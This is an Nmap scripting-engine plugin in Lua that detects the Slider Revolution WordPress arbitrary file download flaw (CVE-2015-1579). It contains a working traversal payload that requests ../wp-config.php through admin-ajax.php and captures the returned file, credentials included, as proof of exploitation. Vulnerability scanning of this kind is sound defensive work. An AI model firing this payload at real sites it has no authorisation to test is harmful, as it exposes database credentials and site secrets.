local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"
local nmap = require "nmap"

description = [[
Directory traversal vulnerability in the Elegant Themes Divi theme for WordPress
allows remote attackers to read arbitrary files
via a .. (dot dot) in the img parameter
in a revslider_show_image action to wp-admin/admin-ajax.php.

NOTE: this vulnerability may be a duplicate of CVE-2014-9734.

Wordpress Slider Revolution Responsive <= 4.1.4
suffers from Arbitrary File Download vulnerability.
]]

---
-- @usage
-- nmap --script http-vuln-cve2015-1579
--
-- @args
-- http-vuln-cve2015-1579.uri
--    Wordpress root directory on the website. Default: '/'
--
-- @output
-- PORT   STATE  SERVICE
-- 80/tcp open   http
-- |  http-vuln-cve2015-1579
-- |    VULNERABLE:
-- |    WordPress Plugin Slider REvolution 4.1.4
-- |    Arbitrary File Download vulnerability
-- |      State: VULNERABLE (Exploitable for versions <= 4.1.4)
-- |      IDs:
-- |        CVE: CVE-2015-1579
-- |        CVE: CVE-2014-9734
-- |          Directory traversal vulnerability in the Elegant Themes Divi theme for WordPress
-- |          allows remote attackers to read arbitrary files
-- |          via a .. (dot dot) in the img parameter
-- |          in a revslider_show_image action to wp-admin/admin-ajax.php.
-- |
-- |          NOTE: this vulnerability may be a duplicate of CVE-2014-9734.
-- |
-- |    References:
-- |      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1579
--
---

author = "Rewanth Cool"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "intrusive", "exploit"}

portrule = shortport.port_or_service( {80, 443}, {"http", "https"}, "tcp", "open")

action = function(host, port)
  local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/"

  local vulnPath = "wp-admin/admin-ajax.php"
  local vulnParams = "action=revslider_show_image&img=../wp-config.php"

  -- Exploiting the vulnerability
  local response = http.get( host, port, uri..vulnPath.."?"..vulnParams )

  if response.status == 200 then
    local vulnReport = vulns.Report:new(SCRIPT_NAME, host, port)
    local vuln = {
      title = "WordPress Plugin Slider REvolution 4.1.4",
      state = vulns.STATE.NOT_VULN,
      description = [[
        Directory traversal vulnerability in the Elegant Themes Divi theme for WordPress
        allows remote attackers to read arbitrary files
        via a .. (dot dot) in the img parameter
        in a revslider_show_image action to wp-admin/admin-ajax.php.

        NOTE: this vulnerability may be a duplicate of CVE-2014-9734.
      ]],
      IDS = {
        CVE = {
          "CVE-2014-9734",
          "CVE-2015-1579"
        },
        references = {
          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1579"
        },
        dates = {
          disclosure = {
            year = "2015",
            month = "02",
            day = "11"
          },
        }
      }
    }

    -- Matching the patern in the response
    if( string.match(response.body, (("<?php"):gsub("%p","%%%0"))) ) then
      vuln.state = vulns.STATE.EXPLOIT
      vuln.exploit_results = response.body
      return vulnReport:make_output(vuln)
    end
  end
end
